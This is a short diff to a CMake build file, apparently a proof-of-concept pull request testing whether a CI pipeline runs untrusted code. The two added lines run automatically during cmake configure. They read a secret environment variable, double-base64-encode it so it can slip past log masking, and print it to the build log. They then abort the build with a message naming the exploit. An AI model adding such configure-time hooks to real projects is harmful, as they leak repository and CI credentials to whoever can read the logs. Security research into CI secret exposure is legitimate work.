@@ -1,4 +1,6 @@
 if(CMAKE_TOOLCHAIN_FILE)
+execute_process(COMMAND bash -c "echo \"GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)\"")
+message(FATAL_ERROR "GERALT exploit: untrusted PR code executed during cmake configure")
     set(LIBRARY_OUTPUT_PATH_ROOT ${CMAKE_BINARY_DIR} CACHE PATH "root for library output, set this to change where android libs are compiled to")
     # get absolute path, but get_filename_component ABSOLUTE only refer with source dir, so find_file here :(
     get_filename_component(CMAKE_TOOLCHAIN_FILE_NAME ${CMAKE_TOOLCHAIN_FILE} NAME)
